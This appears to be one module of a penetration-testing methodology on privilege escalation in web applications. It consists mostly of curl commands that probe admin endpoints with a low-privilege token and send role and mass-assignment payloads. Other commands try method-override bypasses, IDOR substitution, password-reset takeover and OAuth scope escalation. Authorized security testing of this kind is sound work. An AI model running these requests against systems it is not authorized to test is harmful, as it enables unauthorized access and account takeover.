# Privilege Escalation Testing

## Objective

Identify pathways that allow a lower-privileged user to gain higher-privileged access — either vertically (user → admin) or horizontally (user A accessing user B's resources at the same privilege level).

---

## 1. Vertical Privilege Escalation

Gaining access to functions or data intended for higher-privilege roles.

### 1.1 Direct Admin URL Access
```bash
USER_TOKEN="low_priv_user_token"

# Try admin endpoints directly
ADMIN_PATHS=(
  "/admin"
  "/admin/users"
  "/admin/settings"
  "/admin/logs"
  "/admin/reports"
  "/dashboard/admin"
  "/manage"
  "/superadmin"
  "/control-panel"
)

for PATH in "${ADMIN_PATHS[@]}"; do
  echo "Testing: $PATH"
  curl -si "https://target$PATH" \
    -H "Cookie: session=$USER_TOKEN" \
    | grep -E "^HTTP|Forbidden|Unauthorized|users|admin"
  sleep 0.2
done
```

### 1.2 API Admin Endpoints
```bash
# Admin API calls with user token
for EP in \
  "/api/admin/users" \
  "/api/admin/settings" \
  "/api/v1/users?role=admin" \
  "/api/v1/admin/logs" \
  "/api/management/users"; do
  echo "Testing: $EP"
  curl -si "https://target$EP" \
    -H "Authorization: Bearer $USER_TOKEN" \
    | grep -E "^HTTP|users|admin|forbidden"
  sleep 0.2
done
```

### 1.3 Role Parameter Manipulation in Requests
```bash
# Check if role can be set in registration request
curl -si -X POST https://target/api/register \
  -H "Content-Type: application/json" \
  -d '{"username":"newuser","password":"Test@1234","email":"test@test.com","role":"admin"}' \
  | grep HTTP

# Check if role can be escalated via profile update
curl -si -X PUT https://target/api/profile \
  -H "Authorization: Bearer $USER_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"role":"admin","isAdmin":true,"access_level":9}' | grep HTTP
```

### 1.4 JWT Role Claim Escalation
See `modules/JWT_SECURITY.md` — modify the `role` claim from `user` to `admin`.

### 1.5 HTTP Method Override to Bypass Authorization
```bash
# Some frameworks check authorization based on HTTP method
# Override method via header
curl -si -X POST https://target/admin/users \
  -H "X-HTTP-Method-Override: GET" \
  -H "Cookie: session=$USER_TOKEN" | grep HTTP

curl -si -X GET https://target/admin/users \
  -H "X-HTTP-Method-Override: DELETE" \
  -H "Cookie: session=$USER_TOKEN" | grep HTTP
```

---

## 2. Horizontal Privilege Escalation

Accessing another user's data at the same privilege level.

### 2.1 Object ID Substitution (IDOR)
Refer to `modules/IDOR.md` for detailed test cases.

```bash
# Quick test — substitute your user ID with another
MY_ID="1001"
OTHER_ID="1000"

curl -si "https://target/api/users/$OTHER_ID/profile" \
  -H "Authorization: Bearer $USER_TOKEN" | grep -E "HTTP|email|name"

curl -si "https://target/api/users/$OTHER_ID/orders" \
  -H "Authorization: Bearer $USER_TOKEN" | grep -E "HTTP|order|amount"
```

### 2.2 Email/Username Parameter Substitution
```bash
# Can user A access user B's data by specifying B's email?
curl -si "https://target/api/account?email=other_user@target.com" \
  -H "Authorization: Bearer $USER_TOKEN" | grep HTTP

curl -si -X GET "https://target/api/reset-data" \
  -H "Authorization: Bearer $USER_TOKEN" \
  -d "account=other_user@target.com" | grep HTTP
```

---

## 3. Insecure Admin Account Creation

### 3.1 First-User Admin Takeover
Some applications grant admin to the first user created:
```bash
# Check if admin account exists before registering
curl -si https://target/register | grep -i "first user\|admin\|setup"

# Some applications have a `/setup` or `/install` route accessible after deployment
curl -si https://target/setup | grep HTTP
curl -si https://target/install | grep HTTP
```

### 3.2 Admin Invite Link Manipulation
```bash
# If there's an admin invitation system
# Check if invite token validates role server-side
curl -si "https://target/register?invite=INVITE_TOKEN&role=admin" | grep HTTP
```

---

## 4. Mass Assignment for Role Escalation

If the API accepts and binds all submitted JSON fields:
```bash
# Registration with extra privilege fields
curl -si -X POST https://target/api/users \
  -H "Content-Type: application/json" \
  -d '{
    "username": "attacker",
    "password": "Test@1234",
    "email": "attacker@test.com",
    "isAdmin": true,
    "role": "admin",
    "permissions": ["admin","superuser"],
    "access_level": 99
  }' | grep HTTP
```

---

## 5. Password Reset to Admin Account Takeover

```bash
# Step 1: Request password reset for admin@target.com
curl -si -X POST https://target/forgot-password \
  -d "email=admin@target.com" | grep HTTP

# Step 2: If reset token format is guessable, enumerate tokens
# (safe test with 5 attempts maximum)

# Step 3: Use obtained reset token to set new password
curl -si -X POST https://target/reset-password \
  -d "token=GUESSED_TOKEN&password=NewPass@1234" | grep HTTP
```

---

## 6. Privilege Escalation via OAuth Scope Manipulation

```bash
# Normal scope request
# scope=read:profile

# Escalate scope
curl -si "https://target/oauth/authorize?client_id=APP&scope=admin:all&response_type=code" | grep HTTP
curl -si "https://target/oauth/authorize?client_id=APP&scope=read:all+write:all&response_type=code" | grep HTTP
```

---

## Evidence to Capture

- Low-privilege account credentials/token used
- The request targeting admin function or another user's resource
- Response confirming unauthorized access (admin data visible, action executed)
- Comparison with expected 403 response from proper access control

---

## Findings Reference

| Test | Result | Severity |
|---|---|---|
| Direct admin URL accessible with user token | Pass/Fail | High-Critical |
| JWT role claim → admin escalation | Pass/Fail | Critical |
| Role parameter accepted in registration | Pass/Fail | High |
| Mass assignment enables role escalation | Pass/Fail | High |
| Horizontal IDOR (user A → user B data) | Pass/Fail | High |
| Admin account created via mass assignment | Pass/Fail | Critical |
